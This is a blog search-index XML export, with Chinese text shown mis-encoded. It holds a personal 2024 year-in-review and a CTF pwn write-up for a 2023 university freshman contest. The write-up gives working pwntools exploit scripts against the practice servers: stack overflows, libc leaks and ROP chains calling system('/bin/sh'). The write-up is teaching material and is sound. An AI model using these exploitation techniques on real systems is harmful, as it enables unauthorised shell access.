<?xml version="1.0" encoding="utf-8"?>
<search>
  <entry>
    <title>2024å¹´åº¦æ€»ç»“ï¼šä¿æŒæ­£å¿µ å»¶è¿Ÿæ»¡è¶³</title>
    <url>/2024%E5%B9%B4%E5%BA%A6%E6%80%BB%E7%BB%93/</url>
    <content><![CDATA[<p>2024å¹´åº¦æ€»ç»“</p>
<span id="more"></span>


<h1><span id="æ€»ç»“">æ€»ç»“</span></h1><p>&emsp;&emsp;æ—¶å…‰èè‹’ï¼Œå¾ˆå¿«å°±åˆ°äº†å¹´åº•ï¼Œ2024å¹´ä¹Ÿå°±æ‚„æ‚„çš„è¿‡å»äº†ï¼Œå›é¡¾è¿™ä¸€å¹´ï¼Œæœ‰å¾ˆå¤šçš„æ„Ÿè§¦ï¼Œåœ¨æ­¤åšä¸€ä¸ªæ€»ç»“ï¼Œç•™ä¸‹è‡ªå·±çš„è„šå°ã€‚</p>
<h2><span id="ctf">CTF</span></h2><p>&emsp;&emsp;è¦æ€»ç»“çš„ç¬¬ä¸€ä»¶äº‹é‚£å½“ç„¶æ˜¯CTFï¼Œå›é¡¾è¿™ä¸€å¹´ï¼Œä½œä¸ºPWNæ‰‹ï¼Œæ‰“äº†å¤§å¤§å°å°çš„æ¯”èµ›ä¹Ÿä¸å°‘äº†ï¼Œå¾ˆå–œæ¬¢æ¯”èµ›æ—¶çš„é‚£ç§åˆºæ¿€ç´§å¼ çš„æ°›å›´ï¼Œä½†ä¹Ÿä¸æ’é™¤è€æ˜¯åç‰¢çš„é‚£ç§æ— å¥ˆæ²®ä¸§ã€‚æ€»ä¹‹äº‹æƒ…æ˜¯å¾€å¥½çš„æ–¹å‘å‘å±•ï¼Œéšç€åé¢çš„å­¦ä¹ ï¼Œæ„Ÿè§‰PWNè¶Šæ¥è¶Šéš¾ç†è§£ï¼Œè€è®©äººæ‰æ‘¸ä¸é€ï¼Œç»å°½è„‘æ±çš„é‚£ç§ï¼Œå­¦èµ·æ¥å¾ˆç´¯ï¼Œå¯¼è‡´æœ‰æ®µæ—¶é—´ä¸å¤ªæƒ³å­¦PWNäº†ğŸ˜…ğŸ˜…ï¼Œé‚£ä¸ªæ—¶å€™å°±åœ¨ç ”ç©¶å…¶ä»–çš„ä¸œè¥¿ï¼Œå¸Œæœ›æ–°çš„ä¸€å¹´é‡Œï¼Œèƒ½å¤Ÿé‡æ–°æ‹¾èµ·å­¦PWNçš„ä¹è¶£ã€‚</p>
<p><img src="/images/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE%202023-10-09%20074951.png" alt="æˆªå›¾"></p>
<h2><span id="è¶£äº‹">è¶£äº‹</span></h2><p>&emsp;&emsp;è¦æ€»ç»“çš„ç¬¬äºŒä»¶äº‹å°±æ˜¯è‡ªå·±è¿™ä¸€å¹´ç»å†äº†å¾ˆå¤šæœ‰æ„ä¹‰çš„äº‹ã€‚å¹´åˆçš„æ—¶å€™ï¼Œåˆä¸­è€ç­é•¿æ‹‰ç€ä¸€å †äººæ¥äº†ä¸€æ¬¡åŒå­¦èšä¼šï¼Œå¤šå¹´æ²¡è§çš„åŒå­¦ï¼Œåœ¨è§é¢çš„é‚£ä¸€åˆ»ï¼Œè¿˜æ˜¯æ„Ÿè§‰åˆ°æœ‰ç‚¹ç¤¾æğŸ˜‚ğŸ˜‚ï¼Œä¸€èµ·èŠèŠå¤©ï¼Œå°±æ„Ÿè§‰å¥½å¤šäº†ï¼Œå°±å¼€å§‹èŠèµ·æ¥äº†ï¼Œæ°›å›´ä¹Ÿè¶Šæ¥è¶Šå¥½äº†ï¼Œè®²äº†å¾ˆå¤šè‡ªå·±å­¦æ ¡æœ‰å…³çš„è¶£äº‹ï¼Œç„¶åä¸€èµ·å»æ‰“äº†éº»å°†ï¼Œæ€»ä¹‹è¿‡çš„æŒºæ„‰å¿«çš„ã€‚</p>
<p>&emsp;&emsp;å…¶æ¬¡å°±æ˜¯å»è´µå·çº¿ä¸‹å‚åŠ é•¿åŸæ¯äº†ï¼Œç¬¬ä¸€æ¬¡å°è¯•é“é”…ç‚–å¤§é¹…ï¼Œåˆ«æœ‰ä¸€ç•ªé£å‘³ï¼Œå‘³é“è¿˜çœŸä¸é”™ï¼Œå¯æƒœå°±å¯æƒœåŠå†³èµ›æ²¡å¾—å¥–ğŸ˜­ğŸ˜­ï¼Œå°±å·®é‚£ä¸€ä¸¢ä¸¢å°±å¯ä»¥å¾—ä¸‰ç­‰å¥–äº†ï¼Œé˜Ÿå‹ä»¬éƒ½å¾ˆæ£’çš„ï¼ï¼ï¼ä½†æ˜¯è¿™æ¬¡åˆè¿›äº†çº¿ä¸‹ç¬¬äºŒå±Šé•¿åŸæ¯åŠå†³ï¼ŒåŠ æŠŠæ²¹ï¼Œå¸Œæœ›å¯ä»¥å°½åŠ›è¿™æ¬¡å¾—ä¸ªå¥–ï¼ï¼ï¼</p>
<p><img src="/images/1.png"></p>
<p>&emsp;&emsp;é™„ä¸Šå¥½é˜Ÿå‹æ‹çš„ä¸€å¼ å›¾ç‰‡ï¼ŒæŒºå–œæ¬¢è¿™å¼ ç…§ç‰‡çš„ï¼Œæˆ‘çš„ä¸¤ä¸ªé˜Ÿå‹åœ¨åœ°é“å…¬äº¤ä¸Šé¢æ‹çš„ï¼Œå°è±¡å¥½åƒæ˜¯å»èŠ±æºªå¤§å­¦åŸçš„è·¯ä¸Šï¼Œæ€»ä¹‹è¿˜æ˜¯æŒºä¸é”™çš„ï¼Œå°½ç®¡æ¯”èµ›æ²¡æœ‰å¾—å¥–ï¼Œä½†è¿˜æ˜¯æ”¶è·å¾ˆå¤šçš„ä¸œè¥¿çš„ï¼ï¼!</p>
<p><img src="/images/2.png"></p>
<p>&emsp;&emsp;æ¥ç€åº”è¯¥å°±æ˜¯ä¸Šä¸€å­¦å¹´çš„ç»¼æµ‹æ’åäº†ï¼Œæ‹¿äº†ä¸€ä¸ªäºŒç­‰å¥–å­¦é‡‘ï¼Œè¿˜å¾—äº›è¯ä¹¦ï¼Œä¸‹æ¬¡å†æ¥å†å‰ï¼Œç¨³å®šå‘æŒ¥ï¼Œå†²å†²å†²ï¼ï¼ï¼ç„¶åå°±æ˜¯æ¥è¿ä¸€ä¸¤ä¸ªæœˆå’ŒåŒå­¦æ—©èµ·å»æ™¨è·‘ï¼Œæ™šä¸Šä¹Ÿå»é”»ç‚¼ï¼Œæ‹‰å¼•ä½“å‘ä¸Šå­¦ä¼šäº†æŠ€å·§ï¼Œç”¨è…¿è¹¬ä¸€ä¸‹å°±ä¸Šå»ï¼ŒåŠŸå¤«ä¸è´Ÿæœ‰å¿ƒäººï¼Œä½“æµ‹å¾—äº†80åˆ†ğŸ˜ğŸ˜ï¼ˆå¼•ä½“å‘ä¸Šé ç”¨è…¿è¹¬åšäº†åäº”ä¸ªğŸ˜ğŸ˜ï¼‰ï¼Œé™„ä¸Šå­¦æ ¡æ—©ä¸Šå…­ç‚¹çš„æ ·å­ã€‚</p>
<p><img src="/images/3.png"></p>
<p>&emsp;&emsp;ç„¶åå°±æ˜¯è‡ªå·±ä¸€ä¸ªäººåé«˜é“å»ä¹æ±Ÿè½¯è€ƒï¼Œä¹Ÿç®—æ˜¯å¯¹è‡ªå·±çš„ä¸€ç§å†ç»ƒï¼Œè‡ªå·±å‡ºå»é—¯é—¯ï¼Œè®©è‡ªå·±æå‰è¢«ç¤¾ä¼šæ¯’æ‰“ğŸ˜µâ€ğŸ’«ğŸ˜µâ€ğŸ’«ï¼Œå°½ç®¡ç»“æœä¸æ€ä¹ˆæ ·ï¼Œè¿˜å·®äº›å°±è¿‡äº†ï¼Œä½†è¿˜æ˜¯æ”¶è·å¾ˆå¤šçš„ï¼Œé‡åˆ°äº†ä¸€äº›æœ‰æ„ä¹‰çš„äº‹å’Œäººï¼Œè¿˜æ˜¯æŒºä¸é”™çš„ï¼Œä¸‹æ¬¡ç»§ç»­åŠ æ²¹ï¼Œäº‰å–æ‹¿ä¸‹ï¼ï¼ï¼</p>
<p><img src="/images/4.png"></p>
<p>&emsp;&emsp;ğŸš„ğŸš„æœ€ååº”è¯¥å°±å’ŒåŒå­¦ä¸€èµ·å»å—æ˜Œç©äº†ä¸¤å¤©ï¼Œç®—æ˜¯ç¬¬ä¸€æ¬¡å‡ºæ¥æ—…æ¸¸ï¼Œæ€»ä½“æ„Ÿè§‰è¿˜ä¸é”™ï¼Œç¬¬ä¸€å¤©å»çœ‹äº†åŒå­å¡”ï¼Œé€›äº†ç»¿åœ°ï¼Œä¸‡è¾¾......ä¸­åˆåƒäº†è€ä¸‰æ ·ï¼Œè¾£æ¤’è¾£çš„æˆ‘è¥¿è¥¿å«ğŸ¤¤ğŸ¤¤ã€‚</p>
<p><img src="/images/5.png"></p>
<p>&emsp;&emsp;ç„¶åå°±å»äº†å—æ˜Œä¹‹å¿ƒçœ‹äº†ï¼Œåœ¨é‚£é™„è¿‘ç©äº†ä¸‹ï¼Œå‘ç°é‚£ä¸ªåœ°æ–¹æœ‰æŒºå¤šæ‹ç…§çš„ç‚¹ä½çš„ğŸ¤£ğŸ¤£ï¼Œç„¶ååˆæ˜¯æ–°çš„å°è¯•ï¼Œåœ¨ç½‘å§é‡Œé¢è¿‡å¤œï¼Œæœ‰è¶£æ˜¯æœ‰è¶£ï¼ŒååŠå¤œç¡çš„è¾—è½¬åä¾§ï¼Œæœ‰ç‚¹å°éš¾å—ğŸ¥±ğŸ¥±ã€‚</p>
<p><img src="/images/6.png"></p>
<p>&emsp;&emsp;ç¬¬äºŒå¤©å°±å»äº†å…«ä¸€å¹¿åœºï¼Œçœ‹äº†ä¸‹çºªå¿µå¡”ï¼Œåƒäº†é¡¿æ‰“å¹³ç«ï¼ˆä¸€æ ·æ˜¯è¾£çš„ä¸€æ‰¹ï¼‰ï¼Œåœ¨é™„è¿‘é€›äº†é€›ï¼Œå·®ä¸å¤šå°±ç»“æŸäº†ï¼Œè¿‡çš„è¿˜æ˜¯æŒºä¸é”™çš„ï¼Œç¾æ»‹æ»‹ğŸ˜‹ğŸ˜‹ã€‚</p>
<p><img src="/images/7.png"></p>
<h2><span id="æˆé•¿">æˆé•¿</span></h2><p>&emsp;&emsp;è¿™ä¸€å¹´ä¹Ÿç»å†äº†å¾ˆå¤šäº‹å’Œäººï¼Œæ€æƒ³ã€å¿ƒæ€ä¸Šæˆ‘æ„Ÿè§‰ä¹Ÿæˆç†Ÿäº†ä¸å°‘ï¼Œè¿™äº›äº‹è®©æˆ‘æ‡‚å¾—äº†ä¸€ä¸ªé“ç†ï¼šçæƒœçœ¼å‰çš„äººï¼Œå¥½å¥½å¯¹å¾…ä»–ä»¬ï¼Œè¦ä¸ç„¶å¤±å»äº†å°±ä¼šå¾ˆé—æ†¾å¯æƒœï¼Œè¿˜æœ‰å°±æ˜¯å¤šèŠ±æ—¶é—´é™ªé™ªå®¶äººã€‚å¿ƒæ€ä¸Šé¢ï¼Œæˆ‘æ„Ÿè§‰æƒ…ç»ªç¨³å®šäº†ä¸å°‘ï¼Œæ²¡å¿…è¦ä»¥ä¸ºä¸€äº›å°äº‹è€Œå»çƒ¦æ¼ï¼Œå¿ƒæ€æ”¾å¹³ï¼Œè¿™éƒ½ä¸æ˜¯ä»€ä¹ˆäº‹ã€‚å…¶æ¬¡å°±æ˜¯é‡åˆ°äº†å¾ˆå¤šå¾ˆå¥½çš„æœ‹å‹ï¼Œæˆ‘ä¼šå¥½å¥½çæƒœï¼Œå¸Œæœ›ä»–ä»¬ä¹Ÿå¦‚æ­¤ğŸ‘ŠğŸ‘Šã€‚</p>
<h1><span id="å±•æœ›">å±•æœ›</span></h1><p>&emsp;&emsp;å¸Œæœ›2025å¹´ï¼Œå…ƒæ°”æ»¡æ»¡ï¼Œéƒ½èƒ½æŒ‰ç…§è‡ªå·±çš„æƒ³æ³•èµ°ï¼Œä¸ç•™é—æ†¾ï¼Œå¥½è¿è¿è¿ï¼Œä¾æ—§åšæŒä¿æŒæ­£å¿µï¼Œå»¶è¿Ÿæ»¡è¶³ï¼Œæ—¶åˆ»æé†’ç€è‡ªå·±ï¼Œæ–°çš„ä¸€å¹´ï¼Œå†²å†²å†²ï¼ï¼ï¼</p>
<p>&emsp;&emsp;äº‰å–æŠŠå·¥ç¨‹å¸ˆè€ƒè¿‡ï¼Œäº‰å–è¿›ä¸ªé¢„å¤‡é˜Ÿï¼Œæœ€åé‚£è‚¯å®šæ˜¯ä¸Šå²¸äº†ï¼Œå“ˆå“ˆå“ˆå“ˆå“ˆå“ˆï¼ŒåŠ æ²¹åŠ æ²¹åŠ æ²¹ï¼ï¼ï¼ğŸ‘ŠğŸ‘ŠğŸ‘ŠğŸ‘Š</p>
]]></content>
      <categories>
        <category>å¹´åº¦æ€»ç»“</category>
      </categories>
      <tags>
        <tag>å¥‹è¿›</tag>
      </tags>
  </entry>
  <entry>
    <title>2023å¹´SWPU NSS ç§‹å­£æ‹›æ–°èµ› PWN</title>
    <url>/2023%E5%B9%B4SWPU%20NSS%20%E7%A7%8B%E5%AD%A3%E6%8B%9B%E6%96%B0%E8%B5%9B%20PWN/</url>
    <content><![CDATA[<p>2023å¹´SWPU NSS ç§‹å­£æ‹›æ–°èµ› PWN</p>
<span id="more"></span>

<h1><span id="ç®€ä»‹">ç®€ä»‹ï¼š</span></h1><p>è¥¿å—çŸ³æ²¹å¤§å­¦ä¸¾åŠçš„ä¸€åœºæ–°ç”Ÿèµ›ï¼Œæ€»ä½“æ¥è¯´ä¸¾åŠçš„ä¸é”™ï¼Œæ”¯æŒæ”¯æŒï¼Œæ˜å¹´å†æ¥ï¼ï¼ï¼</p>
<hr>
<h2><span id="guess-me">guess me</span></h2><p>ç­¾åˆ°é¢˜ï¼Œncå†çŒœçŒœå°±å®Œäº‹äº†</p>
<p><img src="/images/2023%E5%B9%B4SWPUNSS%E7%A7%8B%E5%AD%A3%E6%8B%9B%E6%96%B0%E8%B5%9BPWN/1.png"></p>
<hr>
<h2><span id="ç­¾åˆ°">ç­¾åˆ°</span></h2><p>ç­¾åˆ°é¢˜ï¼Œæ ˆæº¢å‡ºï¼Œå¸¦æœ‰åé¢å‡½æ•°ï¼Œå”¯ä¸€éœ€è¦æ³¨æ„çš„å°±æ˜¯éœ€è¦æ ˆå¹³è¡¡ï¼ˆåŠ ä¸ª ret å°±è¡Œï¼‰</p>
<p><img src="/images/2023%E5%B9%B4SWPUNSS%E7%A7%8B%E5%AD%A3%E6%8B%9B%E6%96%B0%E8%B5%9BPWN/2.png"></p>
<p><img src="/images/2023%E5%B9%B4SWPUNSS%E7%A7%8B%E5%AD%A3%E6%8B%9B%E6%96%B0%E8%B5%9BPWN/3.png"></p>
<p><strong>exp å¦‚ä¸‹ï¼š</strong></p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context(arch=<span class="string">&quot;amd64&quot;</span>, os=<span class="string">&quot;linux&quot;</span>, log_level=<span class="string">&quot;debug&quot;</span>)</span><br><span class="line"> </span><br><span class="line"><span class="comment"># io = process(&quot;./111&quot;)</span></span><br><span class="line">io = remote(<span class="string">&#x27;node4.anna.nssctf.cn&#x27;</span>, <span class="number">28836</span>)</span><br><span class="line"> </span><br><span class="line">backdoor = <span class="number">0x401232</span></span><br><span class="line">ret_addr = <span class="number">0x40101a</span></span><br><span class="line"> </span><br><span class="line">payload = <span class="string">b&#x27;A&#x27;</span> * (<span class="number">0X30</span> + <span class="number">8</span>) + p64(ret_addr) + p64(backdoor)</span><br><span class="line"> </span><br><span class="line">io.sendline(payload)</span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure>

<hr>
<h2><span id="ezlibc">ezlibc</span></h2><p>ç»å…¸ 32 ä½æ³„éœ² libcï¼Œä¸å¤ªæ‡‚çš„å¯ä»¥çœ‹çœ‹ <a href="https://xzz911.github.io/PWN%20PWN%20PWN%20!!!%20%E6%8A%80%E5%B7%A7%20(1)/">PWN PWN PWN !!! æŠ€å·§ (1)</a>ï¼Œè¿™é¢˜å°±æ˜¯é€šè¿‡ write å‡½æ•°æ³„éœ² libcï¼Œè‡ªå·±æ„é€  rop é“¾ï¼Œæ¥è·å– shellã€‚</p>
<p><img src="/images/2023%E5%B9%B4SWPUNSS%E7%A7%8B%E5%AD%A3%E6%8B%9B%E6%96%B0%E8%B5%9BPWN/4.png"></p>
<p><strong>exp å¦‚ä¸‹ï¼š</strong></p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context(arch=<span class="string">&quot;amd64&quot;</span>, os=<span class="string">&quot;linux&quot;</span>, log_level=<span class="string">&quot;debug&quot;</span>)</span><br><span class="line"> </span><br><span class="line"><span class="comment"># io = process(&quot;./111&quot;)</span></span><br><span class="line">io = remote(<span class="string">&#x27;node6.anna.nssctf.cn&#x27;</span>, <span class="number">28337</span>)</span><br><span class="line">elf = ELF(<span class="string">&#x27;./111&#x27;</span>)</span><br><span class="line">libc = ELF(<span class="string">&#x27;./libc-2.31.so&#x27;</span>)</span><br><span class="line"> </span><br><span class="line">ret_addr = <span class="number">0x804900e</span></span><br><span class="line">main_addr = <span class="number">0x80491B6</span></span><br><span class="line"> </span><br><span class="line">payload = <span class="string">b&#x27;A&#x27;</span> * (<span class="number">0x10</span> + <span class="number">4</span>) + p32(elf.plt[<span class="string">&#x27;write&#x27;</span>]) + p32(main_addr) + p32(<span class="number">1</span>) + p32(elf.got[<span class="string">&#x27;write&#x27;</span>]) + p32(<span class="number">4</span>)</span><br><span class="line"> </span><br><span class="line">io.recvuntil(<span class="string">b&#x27;Hello, there is a ez libc test!!!input:&#x27;</span>)</span><br><span class="line">io.sendline(payload)</span><br><span class="line"> </span><br><span class="line">write_addr = u32(io.recvuntil(<span class="string">b&#x27;\xf7&#x27;</span>)[-<span class="number">4</span>:])</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(write_addr))</span><br><span class="line"> </span><br><span class="line">libc_base = write_addr - libc.sym[<span class="string">&#x27;write&#x27;</span>]</span><br><span class="line">sys_addr = libc_base + libc.sym[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line">bin_sh = libc_base + <span class="built_in">next</span>(libc.search(<span class="string">b&quot;/bin/sh\x00&quot;</span>))</span><br><span class="line"> </span><br><span class="line">payload = <span class="string">b&#x27;A&#x27;</span> * (<span class="number">0x10</span> + <span class="number">4</span>) + p32(ret_addr) + p32(sys_addr) + p32(<span class="number">0</span>) + p32(bin_sh)</span><br><span class="line"> </span><br><span class="line">io.sendline(payload)</span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure>

<hr>
<h2><span id="buy">buy</span></h2><p>è¿™é¢˜ä¹Ÿä¸éš¾ï¼Œè®¤çœŸçš„ä»£ç å®¡è®¡å°±è¡Œï¼Œä»”ç»†çš„å»ç†æ¸…é‡Œé¢çš„é€»è¾‘å°±è¡Œã€‚</p>
<p>åˆšå¼€å§‹çœ‹ vuln å‡½æ•°ï¼Œä½ å°±ä¼šå‘ç° door å‡½æ•°é‡Œé¢å‘ç”Ÿäº†æ ˆæº¢å‡ºï¼Œå¹¶ä¸”è¿˜å¸¦æœ‰åé—¨å‡½æ•° mygiftï¼Œå¯ä»¥åˆ©ç”¨æ ˆæº¢å‡ºæ¥è·å¾— shellï¼Œé‚£æˆ‘ä»¬çš„é¦–è¦ç›®çš„å°±æ˜¯è®© key ç­‰äº 1 ï¼Œè¿™æ ·æ‰èƒ½æ‰§è¡Œ door å‡½æ•°ã€‚</p>
<p><img src="/images/2023%E5%B9%B4SWPUNSS%E7%A7%8B%E5%AD%A3%E6%8B%9B%E6%96%B0%E8%B5%9BPWN/5.png"></p>
<p><img src="/images/2023%E5%B9%B4SWPUNSS%E7%A7%8B%E5%AD%A3%E6%8B%9B%E6%96%B0%E8%B5%9BPWN/6.png"></p>
<p><img src="/images/2023%E5%B9%B4SWPUNSS%E7%A7%8B%E5%AD%A3%E6%8B%9B%E6%96%B0%E8%B5%9BPWN/7.png"></p>
<p>ç„¶åæˆ‘ä»¬å°±æ‰¾å•Šæ‰¾å•Šï¼Œå‘ç°åœ¨ food å‡½æ•°å¯ä»¥å®ç° key ç­‰äº 1ï¼Œä½†å‰æå°±æ˜¯ money å¿…é¡»å¤§äº 10000ï¼ŒåŒæ—¶ä½ ä¹Ÿä¼šå‘ç° money çš„æ•°æ®ç±»å‹æ˜¯æ— ç¬¦å·æ•´å½¢ï¼Œè®©ä»–ç­‰äºè´Ÿæ•°ï¼Œå°±å¯ä»¥å®ç°æ•´å½¢æº¢å‡ºçš„æ•ˆæœï¼Œè¿™æ · money å°±ä¼šè¹­è¹­çš„å¾€ä¸Šæ¶¨ã€‚</p>
<p>å…¶æ¬¡éœ€è¦æ³¨æ„çš„å°±æ˜¯ä¸åŒå‡½æ•°çš„æ¥å›åˆ‡æ¢ï¼Œä½ éœ€è¦æƒ³å¥½ä½ è¦å¹²ä»€ä¹ˆï¼Œè¿™æ ·æ‰èƒ½è·å¾— shellã€‚</p>
<p>è¿™é¢˜åŒæ ·éœ€è¦æ ˆå¹³è¡¡ï¼ˆæ€ä¹ˆåˆ¤å‘¢ï¼Ÿå¦‚æœ payload &#x3D; åƒåœ¾æ•°æ® + system + binsh æ‰“ä¸é€šçš„è¯ï¼Œä¸å¦¨è¯•è¯•åœ¨ system å‰é¢åŠ ä¸ª ret æ ˆå¹³è¡¡ä¸€ä¸‹ï¼‰</p>
<p><img src="/images/2023%E5%B9%B4SWPUNSS%E7%A7%8B%E5%AD%A3%E6%8B%9B%E6%96%B0%E8%B5%9BPWN/8.png"></p>
<p><strong>exp å¦‚ä¸‹ï¼š</strong></p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context(arch=<span class="string">&quot;amd64&quot;</span>, os=<span class="string">&quot;linux&quot;</span>, log_level=<span class="string">&quot;debug&quot;</span>)</span><br><span class="line"> </span><br><span class="line"><span class="comment"># io = process(&quot;./111&quot;)</span></span><br><span class="line">io = remote(<span class="string">&#x27;node6.anna.nssctf.cn&#x27;</span>, <span class="number">28209</span>)</span><br><span class="line"> </span><br><span class="line">backdoor = <span class="number">0x401544</span></span><br><span class="line">ret_addr = <span class="number">0x40101a</span></span><br><span class="line"> </span><br><span class="line">io.sendlineafter(<span class="string">b&#x27;your choice:\n&#x27;</span>, <span class="string">b&#x27;1&#x27;</span>)</span><br><span class="line">io.sendlineafter(<span class="string">b&#x27;what do you want?\n&#x27;</span>, <span class="string">b&#x27;1&#x27;</span>)</span><br><span class="line">io.sendlineafter(<span class="string">b&#x27;How many?\n&#x27;</span>, <span class="string">b&#x27;-11&#x27;</span>)</span><br><span class="line"> </span><br><span class="line">io.sendlineafter(<span class="string">b&#x27;your choice:\n&#x27;</span>, <span class="string">b&#x27;2&#x27;</span>)</span><br><span class="line">io.sendlineafter(<span class="string">b&#x27;what do you want?\n&#x27;</span>, <span class="string">b&#x27;1&#x27;</span>)</span><br><span class="line">io.sendlineafter(<span class="string">b&#x27;How many?\n&#x27;</span>, <span class="string">b&#x27;1&#x27;</span>)</span><br><span class="line"> </span><br><span class="line">payload = <span class="string">b&#x27;A&#x27;</span> * (<span class="number">0XA</span> + <span class="number">8</span>) + p64(ret_addr) + p64(backdoor)</span><br><span class="line"> </span><br><span class="line">io.recvuntil(<span class="string">b&#x27;input:\n&#x27;</span>)</span><br><span class="line">io.sendline(payload)</span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure>

<hr>
<h2><span id="ç¥å¥‡çš„-strlen">ç¥å¥‡çš„ strlen</span></h2><p>æŸ¥çœ‹ä¸€ä¸‹ä¿æŠ¤æœºåˆ¶ï¼Œåªæ‰“å¼€äº† NXã€‚</p>
<p><img src="/images/2023%E5%B9%B4SWPUNSS%E7%A7%8B%E5%AD%A3%E6%8B%9B%E6%96%B0%E8%B5%9BPWN/9.png"></p>
<p>IDA åæ±‡ç¼–ä¸€ä¸‹ï¼Œå‘ç°å‘ç”Ÿäº†æ ˆæº¢å‡ºï¼Œä½†æ˜¯å‰ææ˜¯éœ€è¦ç»•è¿‡ strlenï¼ˆåªéœ€è¦é€šè¿‡ <code>\x00</code> ç»•è¿‡ï¼‰ï¼Œè¿˜æœ‰ä¸€ä¸ªç‚¹éœ€è¦æ³¨æ„å°±æ˜¯ä¸Šé¢éœ€è¦è¾“å…¥ä¸€ä¸ªæ•´æ•°ï¼ˆå°½å¯èƒ½å¤§ç‚¹çš„æ•°å°±è¡Œï¼‰ã€‚</p>
<p>è¿™é‡Œæœ‰ä¸ªå‘ä¸çŸ¥é“ä½ ä»¬è¸©äº†æ²¡ï¼Œè¿™é¢˜æ˜¯ç”¨ï¼š</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">puts_addr = u64(p.recvuntil(<span class="string">b&#x27;\x7f&#x27;</span>)[-<span class="number">6</span>:].ljust(<span class="number">8</span>, <span class="string">b&#x27;\x00&#x27;</span>))</span><br></pre></td></tr></table></figure>

<p>è€Œä¸æ˜¯ï¼š</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">puts_addr = u64(p.recvuntil(<span class="string">b&#x27;\x7f&#x27;</span>)[:<span class="number">6</span>].ljust(<span class="number">8</span>, <span class="string">b&#x27;\x00&#x27;</span>))</span><br></pre></td></tr></table></figure>

<p>å¸Œæœ›å¤§å®¶æ³¨æ„ä¸€ä¸‹ï¼Œå¼„å¾—æˆ‘æƒ³åŠå¤©æ²¡æœ‰å†™å‡ºæ¥â€¦â€¦</p>
<p>å‡†å¤‡å·¥ä½œå®Œæ¯•ï¼Œå¼€å¹²ï¼</p>
<p><img src="/images/2023%E5%B9%B4SWPUNSS%E7%A7%8B%E5%AD%A3%E6%8B%9B%E6%96%B0%E8%B5%9BPWN/10.png"></p>
<p><strong>exp å¦‚ä¸‹ï¼š</strong></p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> *</span><br><span class="line">context(arch=<span class="string">&#x27;amd64&#x27;</span>, os=<span class="string">&#x27;linux&#x27;</span>, log_level=<span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line"> </span><br><span class="line">p = remote(<span class="string">&#x27;node4.anna.nssctf.cn&#x27;</span>, <span class="number">28171</span>)</span><br><span class="line">elf = ELF(<span class="string">&#x27;./111&#x27;</span>)</span><br><span class="line">libc = ELF(<span class="string">&#x27;libc.so.6&#x27;</span>)</span><br><span class="line"> </span><br><span class="line">got_addr = elf.got[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">plt_addr = elf.plt[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">main_addr = <span class="number">0x4011F6</span></span><br><span class="line">rdi_addr = <span class="number">0x401373</span></span><br><span class="line">ret_addr = <span class="number">0x40101a</span></span><br><span class="line"> </span><br><span class="line">p.sendlineafter(<span class="string">&#x27;How many bytes do you want to input?\n&#x27;</span>, <span class="string">b&#x27;200&#x27;</span>)</span><br><span class="line"> </span><br><span class="line">payload = <span class="string">b&#x27;\x00&#x27;</span> + <span class="string">b&#x27;A&#x27;</span> * (<span class="number">0x40</span> + <span class="number">7</span>) + p64(rdi_addr) + p64(got_addr) + p64(plt_addr) + p64(main_addr)</span><br><span class="line">p.recvuntil(<span class="string">b&#x27;input something else~\n&#x27;</span>)</span><br><span class="line">p.sendline(payload)</span><br><span class="line"> </span><br><span class="line">puts_addr = u64(p.recvuntil(<span class="string">b&#x27;\x7f&#x27;</span>)[-<span class="number">6</span>:].ljust(<span class="number">8</span>, <span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(puts_addr))</span><br><span class="line"> </span><br><span class="line"><span class="comment"># put_addr = u64(io.recv(6).ljust(8, b&#x27;\x00&#x27;))</span></span><br><span class="line"><span class="comment"># print(hex(put_addr))</span></span><br><span class="line"> </span><br><span class="line">libc_base = puts_addr - libc.sym[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">sys_addr = libc_base + libc.sym[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line">bin_sh = libc_base + <span class="built_in">next</span>(libc.search(<span class="string">b&quot;/bin/sh\x00&quot;</span>))</span><br><span class="line"> </span><br><span class="line">p.sendlineafter(<span class="string">&#x27;How many bytes do you want to input?\n&#x27;</span>, <span class="string">b&#x27;200&#x27;</span>)</span><br><span class="line"> </span><br><span class="line">payload = <span class="string">b&#x27;\x00&#x27;</span> + <span class="string">b&#x27;a&#x27;</span> * (<span class="number">0x40</span> + <span class="number">7</span>) + p64(ret_addr) + p64(rdi_addr) + p64(bin_sh) + p64(sys_addr)</span><br><span class="line">p.recvuntil(<span class="string">b&#x27;input something else~\n&#x27;</span>)</span><br><span class="line"> </span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>

<hr>
<h2><span id="shellcode">Shellcode</span></h2><p>æ­£å¸¸çš„ä¸€é“ shellcode çš„é¢˜ç›®ï¼Œåˆšå¼€å§‹ä¸èƒ½åæ±‡ç¼–ï¼Œä»¥ä¸ºä¼šå¾ˆéš¾ï¼ˆå› ä¸ºæ±‡ç¼–ä»£ç ä¸æ˜¯å¾ˆæ‡‚ï¼‰ï¼Œç»“æœå‘ç°ç›´æ¥ä¸Šå°±å®Œäº‹äº†ï¼ˆæ³¨æ„ä¸€ä¸‹ 64 ä½çš„ç¯å¢ƒå°±è¡Œï¼‰</p>
